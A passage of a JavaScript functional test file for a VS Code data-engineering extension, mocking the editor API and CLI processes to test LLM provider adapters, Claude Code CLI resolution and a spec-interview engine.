/**
 * Functional tests for the Auto DE Hub Copilot integration.
 * Loads compiled dist modules with a vscode mock.
 * Run: node test/functional.test.cjs
 */
'use strict';

const Module = require('node:module');
const assert = require('node:assert');

// ---------- tiny async iterable helpers ----------
function textIter(text) {
  return { async *[Symbol.asyncIterator]() { yield text; } };
}

function createMock(opts = {}) {
  const installed = opts.chatInstalled !== false;
  const models = opts.models || [{
    name: 'Copilot-4o', id: 'copilot-4o', family: 'gpt-4o', vendor: 'copilot', version: '1', maxInputTokens: 128000,
    sendRequest: async () => ({ text: textIter(opts.streamText || 'hello from copilot') })
  }];
  const known = ['github.copilot-chat', 'GitHub.copilot-chat', 'github.copilot-chat-nightly', 'GitHub.copilot-chat-nightly'];
  return {
    window: { showInformationMessage: async () => {}, showErrorMessage: async () => {},
      registerWebviewViewProvider: () => ({ dispose() {} }),
      registerCustomEditorProvider: () => ({ dispose() {} }),
      registerTreeDataProvider: () => ({ dispose() {} }),
      createStatusBarItem: () => ({ show() {}, hide() {}, dispose() {} }),
      createOutputChannel: () => ({ show() {}, appendLine() {} }) },
    StatusBarAlignment: { Left: 1, Right: 2 },
    commands: { registerCommand: () => ({ dispose() {} }), executeCommand: async () => {} },
    workspace: { getConfiguration: () => ({ get: (_k, f) => (opts.config && (_k in opts.config)) ? opts.config[_k] : f, update: async () => {} }),
      openTextDocument: async () => ({ lineCount: 1, lineAt: () => ({ text: '' }) }),
      fs: {
        createDirectory: async () => {},
        readFile: async () => { throw new Error('ENOENT'); },
        writeFile: async () => {},
        rename: async () => {},
        // Backed by the real filesystem when a test needs to scan an actual directory tree
        // (e.g. artifact-staleness scanning); otherwise behaves like an empty/missing dir.
        readDirectory: async (uri) => {
          const nodeFs = require('node:fs');
          let entries;
          try { entries = nodeFs.readdirSync(uri.fsPath, { withFileTypes: true }); }
          catch { throw new Error('ENOENT'); }
          return entries.map((e) => [e.name, e.isDirectory() ? 2 : 1]);
        }
      },
      createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }),
      workspaceFolders: undefined },
    extensions: { getExtension: (id) => installed && known.includes(id) ? { id, isActive: true } : undefined, all: [] },
    lm: { selectChatModels: async (sel) => { if (!installed) return []; if (sel?.vendor && sel.vendor !== 'copilot') return []; return models; } },
    LanguageModelChatMessage: { User: (c) => ({ role: 1, content: c }), Assistant: (c) => ({ role: 2, content: c }) },
    FileType: { Unknown: 0, File: 1, Directory: 2, SymbolicLink: 64 },
    Uri: {
      file: (p) => ({ fsPath: p, toString: () => p }),
      joinPath: (...parts) => {
        const path = parts.map((p) => (p && typeof p === 'object' && p.fsPath) ? p.fsPath : String(p)).join('/');
        return { fsPath: path, toString: () => path };
      }
    },
    Selection: class {}, Position: class {}, RelativePattern: class {},
    CancellationTokenSource: class { constructor() { this.token = {}; } cancel() {} },
    ConfigurationTarget: { Global: 1 }, EventEmitter: class { constructor() { this.event = () => ({ dispose() {} }); } fire() {} dispose() {} }
  };
}

// ---------- mock loader ----------
const origLoad = Module._load;
let active = null;
Module._load = function (req) {
  if (req === 'vscode') { return active || throw_('no mock'); }
  if ((req === 'child_process' || req === 'node:child_process') && active && active.__childProcess) { return active.__childProcess; }
  if ((req === 'fs' || req === 'node:fs') && active && active.__fs) { return active.__fs; }
  return origLoad.apply(this, arguments);
};
function throw_(m) { throw new Error(m); }

function withMock(mock, fn) { const p = active; active = mock; try { return fn(); } finally { active = p; } }

function mockContext() {
  return { subscriptions: [], extensionUri: { fsPath: '.', toString: () => '.' },
    secrets: { store: async () => {}, get: async () => undefined, delete: async () => {} },
    languageModelAccessInformation: { canSendRequest: () => true } };
}

function fakeCm(settings) {
  return { getSettings: () => settings, getExtensionContext: () => mockContext(), getLlmApiKey: async () => undefined, getSecret: async () => undefined };
}

function fresh(modulePath) { delete require.cache[require.resolve(modulePath)]; return require(modulePath); }

// The language model adapter captures the `vscode` mock at load time, so its
// cache must be cleared whenever a test swaps in a new mock.
function clearAdapterCache() {
  for (const p of ['../dist/core/languageModelAdapter.js', '../dist/core/claudeCodeAdapter.js']) {
    try { delete require.cache[require.resolve(p)]; } catch { /* not loaded yet */ }
  }
}
function freshAdapter(mock) { clearAdapterCache(); return withMock(mock, () => require('../dist/core/languageModelAdapter.js')); }

/** Builds a fresh, consented DataAgentHubHub whose configured LLM always returns `responseText`. */
function hubWithResponse(responseText) {
  const model = { id: 'copilot-4o', family: 'gpt-4o', vendor: 'copilot', version: '1', name: 'Copilot-4o', maxInputTokens: 128000,
    sendRequest: async () => ({ text: textIter(responseText) }) };
  const mock = createMock({ models: [model] });
  delete require.cache[require.resolve('../dist/core/agentHub.js')];
  clearAdapterCache();
  const { DataAgentHubHub } = withMock(mock, () => require('../dist/core/agentHub.js'));
  const hub = new DataAgentHubHub(fakeCm({ activeLlmProvider: 'copilot', activeLlmModel: 'x', languageModelProgrammaticConsent: true, defaultProvider: 'snowflake' }));
  hub.setSpec('bps-test', 1);
  return { hub, mock };
}

// ---------- Claude Code CLI mock ----------
const EventEmitter = require('node:events');

const MOCK_PATH_CLI = process.platform === 'win32' ? 'C:\\mock\\claude.exe' : '/mock/bin/claude';

function claudeCodeMock(opts = {}) {
  const versionOut = opts.versionOut;             // string | null  (null => nothing runnable)
  const explicitPaths = opts.existsPaths || [];   // string[] that fs.existsSync should accept
  const onPath = versionOut != null && opts.onPath !== false; // resolvable via where/which
  const spawnResult = opts.spawnResult || { result: 'PONG', subtype: 'success' };
  const base = createMock();
  const existsPaths = onPath ? explicitPaths.concat([MOCK_PATH_CLI]) : explicitPaths;
  base.__fs = {
    existsSync: (p) => existsPaths.includes(p)
  };
  base.__childProcess = {
    spawnSync: (bin, args) => {
      if (bin === 'where' || bin === 'which') {
        return onPath ? { status: 0, stdout: MOCK_PATH_CLI + '\n' } : { status: 1, stdout: '' };
      }
      // treated as a `<cli> --version` probe
      return versionOut != null ? { status: 0, stdout: versionOut } : { status: 1, stdout: '' };
    },
    spawn: (cmd, args) => {
      base.__lastSpawn = { cmd, args };
      const child = new EventEmitter();
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.stdin = { write: () => {}, end: () => {}, on: () => {} };
      child.kill = () => {};
      setImmediate(() => {
        child.stdout.emit('data', Buffer.from(JSON.stringify(spawnResult)));
        child.emit('close', 0);
      });
      return child;
    }
  };
  return base;
}

function freshClaude(mock) {
  try { delete require.cache[require.resolve('../dist/core/claudeCodeAdapter.js')]; } catch { /* not loaded */ }
  return withMock(mock, () => require('../dist/core/claudeCodeAdapter.js'));
}

// ---------- runner ----------
const results = [];
async function test(name, fn) {
  try { await fn(); results.push({ name, ok: true }); console.log('  PASS  ' + name); }
  catch (e) { results.push({ name, ok: false, err: e }); console.error('  FAIL  ' + name + '\n    ' + (e?.stack || e)); }
}

// ---------- main ----------
async function main() {
  console.log('Running Copilot functional tests...\n');

  await test('languageModelAdapter loads and exports classes', () => {
    const lib = freshAdapter(createMock());
    assert.strictEqual(typeof lib.LanguageModelAdapter, 'function');
  });

  await test('detect() finds Copilot Chat', async () => {
    const mock = createMock();
    const lib = freshAdapter(mock);
    const { info } = await withMock(mock, () => lib.LanguageModelAdapter.detect(mockContext(), { provider: 'copilot' }));
    assert.strictEqual(info.found, true);
    assert.strictEqual(info.hasAccess, true);
    assert.strictEqual(info.provider, 'copilot');
    assert.strictEqual(info.models[0].vendor, 'copilot');
  });

  await test('detect() not installed', async () => {
    const mock = createMock({ chatInstalled: false });
    const lib = freshAdapter(mock);
    const { info } = await withMock(mock, () => lib.LanguageModelAdapter.detect(mockContext(), { provider: 'copilot' }));
    assert.strictEqual(info.found, false);
  });

  await test('ClaudeCodeAdapter.resolve() honors an explicit valid claudeCodePath', () => {
    const mock = claudeCodeMock({ versionOut: '2.1.0 (Claude Code)', existsPaths: ['C:\\tools\\claude.exe'] });
    const lib = freshClaude(mock);
    const r = withMock(mock, () => lib.ClaudeCodeAdapter.resolve('C:\\tools\\claude.exe'));
    assert.strictEqual(r.source, 'setting');
    assert.strictEqual(r.cliPath, 'C:\\tools\\claude.exe');
  });

  await test('ClaudeCodeAdapter.resolve() falls back to PATH', () => {
    const mock = claudeCodeMock({ versionOut: '2.1.0 (Claude Code)', existsPaths: [] });
    const lib = freshClaude(mock);
    const r = withMock(mock, () => lib.ClaudeCodeAdapter.resolve(''));
    assert.strictEqual(r.source, 'path');
  });

  await test('ClaudeCodeAdapter.resolve() reports not-found with guidance', () => {
    const mock = claudeCodeMock({ versionOut: null, existsPaths: [] });
    const lib = freshClaude(mock);
    const r = withMock(mock, () => lib.ClaudeCodeAdapter.resolve(''));
    assert.strictEqual(r.source, 'none');
    assert.match(r.error || '', /Claude Code CLI not found/i);
  });

  await test('ClaudeCodeAdapter.complete() spawns the CLI and parses JSON result', async () => {
    const mock = claudeCodeMock({ versionOut: '2.1.0', spawnResult: { result: '[{"id":"step-1"}]', subtype: 'success' } });
    const lib = freshClaude(mock);
    const { adapter } = await withMock(mock, () => lib.ClaudeCodeAdapter.detect(''));
    assert.ok(adapter, 'expected an adapter');
    const out = await withMock(mock, () => adapter.complete('do it', { model: 'sonnet' }));
    assert.strictEqual(out, '[{"id":"step-1"}]');
    // -p headless + json + no tools for a non-chat call
    assert.ok(mock.__lastSpawn.args.includes('-p') && mock.__lastSpawn.args.includes('--output-format'));
    assert.ok(mock.__lastSpawn.args.includes('--max-turns'));
  });

  await test('ClaudeCodeAdapter.complete() surfaces CLI errors', async () => {
    const mock = claudeCodeMock({ versionOut: '2.1.0', spawnResult: { subtype: 'error_max_turns', is_error: true, result: 'ran out of turns' } });
    const lib = freshClaude(mock);
    const { adapter } = await withMock(mock, () => lib.ClaudeCodeAdapter.detect(''));
    await assert.rejects(() => withMock(mock, () => adapter.complete('x')), /ran out of turns/i);
  });

  await test('getLlmAdapter() dispatches by provider id and falls back to ollama for an unrecognized provider', () => {
    const mock = createMock();
    const { LLM_ADAPTERS, getLlmAdapter } = withMock(mock, () => require('../dist/core/llmProviders.js'));
    assert.strictEqual(getLlmAdapter('openai').id, 'openai');
    assert.strictEqual(getLlmAdapter('not-a-real-provider').id, 'ollama', 'unrecognized provider falls back to ollama, matching the old if/else chain\'s implicit default');
    assert.strictEqual(LLM_ADAPTERS.claude.displayName, 'Claude Code');
    assert.strictEqual(LLM_ADAPTERS.copilot.requiresApiKey, false);
    assert.strictEqual(LLM_ADAPTERS['azure-openai'].supportsCustomEndpoint, true);
  });

  await test('OpenAI adapter builds the expected request and extracts JSON out of the response', async () => {
    const mock = createMock();
    const { getLlmAdapter } = withMock(mock, () => require('../dist/core/llmProviders.js'));
    const origFetch = global.fetch;
    let capturedUrl, capturedInit;
    global.fetch = async (url, init) => {
      capturedUrl = url; capturedInit = init;
      return { ok: true, json: async () => ({ choices: [{ message: { content: '```json\n[{"id":"s1"}]\n```' } }] }) };
    };
    try {
      const ctx = { getSettings: () => ({}), getLlmApiKey: async () => 'sk-test', getExtensionContext: () => undefined, getWorkspaceRoot: () => undefined, log: () => {} };
      const out = await getLlmAdapter('openai').complete('do it', { model: 'gpt-4o-mini', systemPrompt: 'sys' }, ctx);
      assert.strictEqual(out, '[{"id":"s1"}]');
      assert.strictEqual(capturedUrl, 'https://api.openai.com/v1/chat/completions');
      assert.ok(capturedInit.headers.Authorization.includes('sk-test'));
      assert.strictEqual(JSON.parse(capturedInit.body).messages[0].content, 'sys');
    } finally { global.fetch = origFetch; }
  });

  await test('A fetch-based adapter surfaces a clear error when the API key is missing', async () => {
    const mock = createMock();
    const { getLlmAdapter } = withMock(mock, () => require('../dist/core/llmProviders.js'));
    const ctx = { getSettings: () => ({}), getLlmApiKey: async () => undefined, getExtensionContext: () => undefined, getWorkspaceRoot: () => undefined, log: () => {} };
    await assert.rejects(() => getLlmAdapter('anthropic').complete('x', { model: 'claude-x', systemPrompt: 'sys' }, ctx), /API key is missing/i);
  });

  await test('A fetch-based adapter surfaces a clear timeout error instead of hanging on an unreachable endpoint', async () => {
    const mock = createMock();
    const { getLlmAdapter } = withMock(mock, () => require('../dist/core/llmProviders.js'));
    const origFetch = global.fetch;
    // Simulates what a real AbortController-driven timeout looks like to the caller
    // (fetch() rejecting with a DOMException-style AbortError) without waiting out a
    // real multi-second timer — the timeout duration itself isn't what's under test,
    // just that an AbortError gets mapped to a clear, bounded message.
    global.fetch = async () => {
      const err = new Error('The operation was aborted.');
      err.name = 'AbortError';
      throw err;
    };
    try {
      const ctx = { getSettings: () => ({}), getLlmApiKey: async () => 'sk-test', getExtensionContext: () => undefined, getWorkspaceRoot: () => undefined, log: () => {} };
      await assert.rejects(
        () => getLlmAdapter('openai').complete('x', { model: 'gpt-4o-mini', systemPrompt: 'sys' }, ctx),
        /timed out after/i,
        'a hung request should reject with a bounded, clear timeout message rather than never resolving'
      );
    } finally { global.fetch = origFetch; }
  });

  await test('complete() streams text', async () => {
    const model = { id: 'm', family: 'gpt', vendor: 'copilot', version: '1', name: 'm', maxInputTokens: 100,
      sendRequest: async (msgs) => { assert.strictEqual(msgs.length, 1); return { text: textIter('[{"id":"step-1"}]') }; } };
    const mock = createMock({ models: [model] });
    const lib = freshAdapter(mock);
    const { adapter } = await withMock(mock, () => lib.LanguageModelAdapter.detect(mockContext(), { provider: 'copilot' }));
    const t = await withMock(mock, () => adapter.complete('prompt', { timeoutMs: 500 }));
    assert.strictEqual(t, '[{"id":"step-1"}]');
  });

  await test('activate() registers subscriptions', () => {
    const mock = createMock();
    withMock(mock, () => {
      const ext = fresh('../dist/extension.js');
      const ctx = mockContext();
      ext.activate(ctx);
      assert.ok(ctx.subscriptions.length > 0);
    });
  });

  // ── Spec-driven phase inference (pure module) ──

  // ── Agentic spec generation (Phase A: skills registry + SpecOps engine) ──
  const nodePath = require('node:path');

  await test('parseSkillDefinition() normalizes and validates', () => {
    const { parseSkillDefinition } = require('../dist/engine/skills/skillRegistry.js');
    const skill = parseSkillDefinition({ id: 'x', name: 'X', systemPrompt: 'p', specFields: ['a', 'b', 1, ''] });
    assert.strictEqual(skill.id, 'x');
    assert.deepStrictEqual(skill.specFields, ['a', 'b']);
    assert.strictEqual(skill.order, 0);
    assert.throws(() => parseSkillDefinition({ name: 'No id' }), /requires an "id"/);
    assert.throws(() => parseSkillDefinition({ id: 'y', name: 'Y' }), /systemPrompt/);
  });

  await test('SkillRegistry orders skills and maps fields', () => {
    const { SkillRegistry } = require('../dist/engine/skills/skillRegistry.js');
    const reg = new SkillRegistry([
      { id: 'b', name: 'B', order: 2, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['dataFlows'] },
      { id: 'a', name: 'A', order: 1, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['objectives', 'dataFlows'] }
    ]);
    assert.deepStrictEqual(reg.list().map((s) => s.id), ['a', 'b']);
    assert.deepStrictEqual(reg.skillsForField('dataFlows').map((s) => s.id), ['a', 'b']);
    assert.deepStrictEqual(reg.allSpecFields().sort(), ['dataFlows', 'objectives']);
    assert.strictEqual(reg.questionSkills().length, 2);
  });

  await test('v0.45.12: the interview\'s parts are AutoDE skills (autode-de-interview-*, the specification authoring skill), read back as the interview engine uses them; a team\'s JSON part replaces one by id', () => {
    const { interviewSkills } = require('../dist/engine/skills/skillRegistry.js');
    const { loadSkillPack } = require('../dist/engine/agents/definitions.js');
    const skills = interviewSkills(loadSkillPack(nodePath.join(__dirname, '..')).skills);
    assert.deepStrictEqual(skills.map((s) => s.id), ['requirements-discovery', 'source-catalog', 'data-flow', 'transformations', 'quality-acceptance', 'constraints-assumptions', 'governance', 'synthesis']);
    assert.ok(skills.every((s) => s.id && s.systemPrompt && s.questionGuidance));
    const src = skills.find((s) => s.id === 'source-catalog');
    assert.deepStrictEqual([src.name, src.order, src.specFields, src.exampleQuestions.length], ['Source Catalog', 2, ['sourceCatalog', 'dataFlows'], 2]);
    assert.deepStrictEqual(skills.find((s) => s.id === 'synthesis').specFields, [], 'authoring asks nothing');
    const nodeFs = require('node:fs');
    const dir = nodeFs.mkdtempSync(nodePath.join(require('node:os').tmpdir(), 'autode-parts-'));
    try {
      nodeFs.writeFileSync(nodePath.join(dir, 'source-catalog.json'), JSON.stringify({ id: 'source-catalog', name: 'Our sources', order: 2, description: 'd', systemPrompt: 'Ask about our mainframe feeds.', questionGuidance: 'g', specFields: ['sourceCatalog'] }));
      const merged = interviewSkills(loadSkillPack(nodePath.join(__dirname, '..')).skills, dir);
      assert.deepStrictEqual([merged.length, merged.find((s) => s.id === 'source-catalog').name], [8, 'Our sources']);
    } finally { nodeFs.rmSync(dir, { recursive: true, force: true }); }
  });

  await test('createIntakeSession() seeds coverage and budget', () => {
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const session = createIntakeSession('Build a marts pipeline', { fields: ['dataFlows', 'objectives'], turnBudget: 5, now: '2026-01-01T00:00:00.000Z' });
    assert.strictEqual(session.state, 'discovery');
    assert.strictEqual(session.turnBudget, 5);
    assert.deepStrictEqual(session.coverage, { dataFlows: 'missing', objectives: 'missing' });
    assert.throws(() => createIntakeSession('   '), /problem statement/i);
  });

  await test('createIntakeSession() seeds a revision from a previous approved spec', () => {
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const previousSpec = {
      id: 'bps-1', version: 2, status: 'approved', problemStatement: 'Original problem',
      objectives: ['grow revenue'], successCriteria: [], scope: { in: ['orders'], out: [] },
      constraints: [], assumptions: [], createdAt: 't', updatedAt: 't'
    };
    const session = createIntakeSession('Also include returns data', { fields: ['dataFlows'], previousSpec });
    assert.strictEqual(session.problemStatement, 'Original problem', 'problemStatement carries the previous spec, not the change text');
    assert.strictEqual(session.changeRequest, 'Also include returns data');
    assert.strictEqual(session.specId, 'bps-1');
    assert.strictEqual(session.previousSpec, previousSpec);
    assert.throws(() => createIntakeSession('  ', { previousSpec }), /requested change/i);
  });

  await test('SpecOpsEngine tracks coverage and stop condition', () => {
    const { createIntakeSession, SpecOpsEngine } = require('../dist/engine/interview/specOps.js');
    const engine = new SpecOpsEngine(createIntakeSession('x', { fields: ['objectives', 'dataFlows'], turnBudget: 2, now: '2026-01-01T00:00:00.000Z' }));
    assert.strictEqual(engine.shouldSynthesize(), false);
    engine.ask([{ id: 'q1', field: 'objectives', prompt: 'What objective?', kind: 'text', askedAt: 't' }]);
    engine.answer({ questionId: 'q1', field: 'objectives', value: 'revenue', answeredAt: 't' });
    assert.strictEqual(engine.getCoverage().objectives, 'partial');
    engine.completeFields(['dataFlows']);
    assert.strictEqual(engine.coverageComplete(), true);
    assert.strictEqual(engine.shouldSynthesize(), true);
  });

  await test('SpecOpsEngine budget alone triggers synthesis', () => {
    const { createIntakeSession, SpecOpsEngine } = require('../dist/engine/interview/specOps.js');
    const engine = new SpecOpsEngine(createIntakeSession('x', { fields: ['objectives'], turnBudget: 1 }));
    engine.ask([{ id: 'q1', field: 'objectives', prompt: 'p?', kind: 'text', askedAt: 't' }]);
    assert.strictEqual(engine.shouldSynthesize(), true);
  });

  await test('validateAction() accepts valid actions and rejects invalid ones', () => {
    const { SpecOpsEngine } = require('../dist/engine/interview/specOps.js');
    const a = SpecOpsEngine.validateAction({ action: 'ask', question: { field: 'objectives', prompt: 'What?', kind: 'text' } });
    assert.strictEqual(a.action, 'ask');
    assert.strictEqual(a.question.field, 'objectives');
    const b = SpecOpsEngine.validateAction({ action: 'ask_many', questions: [{ field: 'dataFlows', prompt: 'p', kind: 'single-select', options: ['a', 'b'] }] });
    assert.strictEqual(b.action, 'ask_many');
    assert.strictEqual(b.questions[0].options.length, 2);
    assert.strictEqual(SpecOpsEngine.validateAction({ action: 'synthesize' }).action, 'synthesize');
    assert.strictEqual(SpecOpsEngine.validateAction({ action: 'done' }).action, 'done');
    assert.throws(() => SpecOpsEngine.validateAction({ action: 'ask', question: { field: '', prompt: 'x', kind: 'text' } }), /field/);
    assert.throws(() => SpecOpsEngine.validateAction({ action: 'ask', question: { field: 'x', prompt: '', kind: 'text' } }), /prompt/);
    assert.throws(() => SpecOpsEngine.validateAction({ action: 'ask', question: { field: 'x', prompt: 'p', kind: 'weird' } }), /kind/);
    assert.throws(() => SpecOpsEngine.validateAction({ action: 'ask_many', questions: [] }), /non-empty/);
    assert.throws(() => SpecOpsEngine.validateAction({ action: 'fly' }), /Unknown/);
  });


  await test('applyAction() asks questions, assigns ids, and transitions state', () => {
    const { createIntakeSession, SpecOpsEngine } = require('../dist/engine/interview/specOps.js');
    const engine = new SpecOpsEngine(createIntakeSession('x', { fields: ['objectives'], now: '2026-01-01T00:00:00.000Z' }));
    const ids = engine.applyAction({ action: 'ask', question: { field: 'objectives', prompt: 'What?', kind: 'text' } }, '2026-01-01T00:00:01.000Z');
    assert.deepStrictEqual(ids, ['q-1']);
    assert.strictEqual(engine.getSession().questions[0].id, 'q-1');
    assert.strictEqual(engine.getSession().turnCount, 1);
    const ids2 = engine.applyAction({ action: 'ask_many', questions: [{ field: 'objectives', prompt: 'a', kind: 'text' }, { field: 'dataFlows', prompt: 'b', kind: 'text' }] });
    assert.deepStrictEqual(ids2, ['q-2', 'q-3']);
    assert.strictEqual(engine.getSession().turnCount, 3);
    engine.applyAction({ action: 'synthesize' });
    assert.strictEqual(engine.getState(), 'synthesizing');
    engine.applyAction({ action: 'done' });
    assert.strictEqual(engine.getState(), 'approved');
  });

  await test('buildDiscoveryTurnPrompt() includes problem, gaps, and skills', () => {
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const { buildDiscoveryTurnPrompt } = require('../dist/core/specOpsPrompts.js');
    const session = createIntakeSession('Load sales into a mart', { fields: ['dataFlows', 'objectives'] });
    const skills = [{ id: 'data-flow', name: 'Data Flow', order: 1, description: '', systemPrompt: 'p', questionGuidance: 'map flows', specFields: ['dataFlows'], exampleQuestions: ['Which flow?'] }];
    const { system, user } = buildDiscoveryTurnPrompt(session, skills);
    assert.ok(system.includes('single valid JSON object'), 'system prompt instructs JSON-only');
    assert.ok(user.includes('Load sales into a mart'), 'user prompt includes problem statement');
    assert.ok(user.includes('dataFlows (missing)'), 'user prompt includes coverage gaps');
    assert.ok(user.includes('data-flow'), 'user prompt includes skill guidance');
  });

  await test('buildDiscoveryTurnPrompt() renders the previous spec + change request for a revision, plus registered context and attachments', () => {
    const { createIntakeSession, SpecOpsEngine } = require('../dist/engine/interview/specOps.js');
    const { buildDiscoveryTurnPrompt } = require('../dist/core/specOpsPrompts.js');
    const previousSpec = {
      id: 'bps-1', version: 3, status: 'approved', problemStatement: 'Original problem',
      objectives: ['grow revenue'], successCriteria: [], scope: { in: ['orders'], out: [] },
      constraints: [], assumptions: [], dataFlows: [{ id: 'f1', source: 'orders', target: 'fact_sales', description: 'raw to fact' }],
      createdAt: 't', updatedAt: 't'
    };
    const engine = new SpecOpsEngine(createIntakeSession('Add returns data', { fields: ['dataFlows'], previousSpec }));
    engine.addAttachment({ path: 'docs/returns-schema.md', content: 'returns table has order_id, refund_amount', attachedAt: 't' });
    const { system, user } = buildDiscoveryTurnPrompt(engine.getSession(), [], 'Registered term: "Return" = a reversed order');
    assert.ok(system.includes('REVISING'), 'system prompt carries the revision rules');
    assert.ok(user.includes('Add returns data'), 'user prompt includes the requested change');
    assert.ok(user.includes('Original problem'), 'user prompt includes the previous spec snapshot');
    assert.ok(user.includes('orders -> fact_sales'), 'user prompt includes previous data flows');
    assert.ok(user.includes('Registered term'), 'user prompt includes registered repository context');
    assert.ok(user.includes('returns-schema.md') && user.includes('refund_amount'), 'user prompt includes the attached file');
  });


  await test('parseComprehensiveSpec() produces v2 fields and provenance', () => {
    const { parseComprehensiveSpec } = require('../dist/core/specSynthesis.js');
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const session = createIntakeSession('Load sales into a mart', { fields: ['dataFlows'], now: '2026-01-01T00:00:00.000Z' });
    session.questions.push({ id: 'q1', field: 'dataFlows', prompt: 'Which flow?', kind: 'text', askedAt: 't' });
    session.answers.push({ questionId: 'q1', field: 'dataFlows', value: 'orders to facts', answeredAt: 't' });
    const spec = parseComprehensiveSpec({
      problemStatement: 'Load sales into a mart',
      objectives: ['analyze revenue'],
      scope: { in: ['orders'], out: [] },
      businessRequirements: ['daily mart'],
      dataFlows: [{ source: 'orders', target: 'fact_sales', description: 'raw to fact', frequency: 'daily' }],
      transformations: ['dedupe'],
      dependencies: ['source extract'],
      acceptanceCriteria: ['row counts reconcile'],
      implementationConsiderations: ['incremental'],
      sourceCatalog: [{ name: 'orders_db', type: 'database' }]
    }, { session });
    assert.strictEqual(spec.status, 'draft');
    assert.deepStrictEqual(spec.businessRequirements, ['daily mart']);
    assert.strictEqual(spec.dataFlows[0].id, 'f1');
    assert.strictEqual(spec.dataFlows[0].target, 'fact_sales');
    assert.strictEqual(spec.sourceCatalog[0].type, 'database');
    assert.deepStrictEqual(spec.acceptanceCriteria, ['row counts reconcile']);
    const prov = spec.provenance.find((p) => p.field === 'dataFlows');
    assert.strictEqual(prov.source, 'question');
    assert.strictEqual(prov.questionId, 'q1');
    const synthProv = spec.provenance.find((p) => p.field === 'businessRequirements');
    assert.strictEqual(synthProv.source, 'synthesis');
  });

  await test('parseComprehensiveSpec() revision: carries forward untouched fields, bumps version, preserves provenance', () => {
    const { parseComprehensiveSpec } = require('../dist/core/specSynthesis.js');
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const previous = {
      id: 'bps-1', version: 2, status: 'approved', problemStatement: 'Original problem',
      objectives: ['grow revenue'], successCriteria: ['NPS up'], scope: { in: ['orders'], out: ['returns'] },
      constraints: ['must use existing warehouse'], assumptions: [], domain: 'retail',
      businessRequirements: ['daily refresh'], dataFlows: [{ id: 'f1', source: 'orders', target: 'fact_sales', description: 'raw to fact' }],
      sourceCatalog: [{ name: 'orders_db', type: 'database' }],
      provenance: [{ field: 'objectives', source: 'question', questionId: 'orig-q1' }],
      createdAt: 't0', updatedAt: 't0'
    };
    const session = createIntakeSession('Also bring in returns data', { fields: ['scope'], previousSpec: previous, now: '2026-02-01T00:00:00.000Z' });
    session.questions.push({ id: 'q1', field: 'scope', prompt: 'What changes to scope?', kind: 'text', askedAt: 't' });
    session.answers.push({ questionId: 'q1', field: 'scope', value: 'include returns', answeredAt: 't' });
    // The revision's own synthesis output only addresses scope — everything else
    // must be carried forward from `previous`, not dropped.
    const spec = parseComprehensiveSpec({
      problemStatement: 'Original problem',
      objectives: [],
      scope: { in: ['orders', 'returns'], out: [] }
    }, { previous, session });
    assert.strictEqual(spec.id, 'bps-1', 'id is preserved across a revision');
    assert.strictEqual(spec.version, 3, 'version bumps only because the previous spec was approved');
    assert.strictEqual(spec.status, 'draft');
    assert.deepStrictEqual(spec.objectives, ['grow revenue'], 'empty objectives fall back to the previous spec, not an error');
    assert.deepStrictEqual(spec.scope.in, ['orders', 'returns'], 'fields the revision addressed are NOT overridden by the fallback');
    assert.deepStrictEqual(spec.successCriteria, ['NPS up'], 'untouched optional field is carried forward');
    assert.deepStrictEqual(spec.constraints, ['must use existing warehouse']);
    assert.deepStrictEqual(spec.businessRequirements, ['daily refresh']);
    assert.strictEqual(spec.dataFlows[0].target, 'fact_sales');
    assert.strictEqual(spec.domain, 'retail');
    const objProv = spec.provenance.find((p) => p.field === 'objectives');
    assert.strictEqual(objProv.source, 'question', 'provenance for an untouched field is carried forward from the previous spec, not marked "synthesis"');
    assert.strictEqual(objProv.questionId, 'orig-q1');
    const scopeProv = spec.provenance.find((p) => p.field === 'scope');
    assert.strictEqual(scopeProv.source, 'question', 'provenance for a field this session answered points at the new question');
    assert.strictEqual(scopeProv.questionId, 'q1');
  });

  await test('parseComprehensiveSpec() does not bump version when the previous spec was only a draft', () => {
    const { parseComprehensiveSpec } = require('../dist/core/specSynthesis.js');
    const previous = { id: 'bps-1', version: 1, status: 'draft', problemStatement: 'x', objectives: ['a'], scope: { in: ['a'] }, createdAt: 't', updatedAt: 't' };
    const spec = parseComprehensiveSpec({ problemStatement: 'y', objectives: ['b'], scope: { in: ['b'] } }, { previous });
    assert.strictEqual(spec.version, 1);
  });

  await test('buildSynthesisPrompt() includes the previous spec + change request for a revision', () => {
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const { buildSynthesisPrompt } = require('../dist/core/specOpsPrompts.js');
    const previousSpec = {
      id: 'bps-1', version: 4, status: 'approved', problemStatement: 'Original problem',
      objectives: ['grow revenue'], successCriteria: [], scope: { in: ['orders'], out: [] },
      constraints: [], assumptions: [], createdAt: 't', updatedAt: 't'
    };
    const session = createIntakeSession('Add returns data', { previousSpec });
    const { system, user } = buildSynthesisPrompt(session, 'Verified query: returns_by_month');
    assert.ok(system.includes('REVISION'), 'system prompt carries the revision synthesis rules');
    assert.ok(user.includes('Add returns data'));
    assert.ok(user.includes('Original problem'));
    assert.ok(user.includes('Verified query'), 'registered context reaches the synthesis prompt too');
  });

  await test('parseComprehensiveSpec() rejects invalid payloads', () => {
    const { parseComprehensiveSpec } = require('../dist/core/specSynthesis.js');
    assert.throws(() => parseComprehensiveSpec(null), /JSON object/);
    assert.throws(() => parseComprehensiveSpec({ objectives: ['x'], scope: { in: ['a'] } }), /problemStatement/);
    assert.throws(() => parseComprehensiveSpec({ problemStatement: 'x', scope: { in: ['a'] } }), /objectives/);
    assert.throws(() => parseComprehensiveSpec({ problemStatement: 'x', objectives: ['a'], scope: { in: [] } }), /in-scope/);
  });

  await test('synthesizeComprehensiveSpec() returns a v2 spec via the LLM', async () => {
    const payload = JSON.stringify({
      problemStatement: 'Load sales into a mart',
      objectives: ['analyze revenue'],
      scope: { in: ['orders'], out: [] },
      businessRequirements: ['daily mart'],
      dataFlows: [{ source: 'orders', target: 'fact_sales', description: 'raw to fact' }],
      acceptanceCriteria: ['reconcile counts']
    });
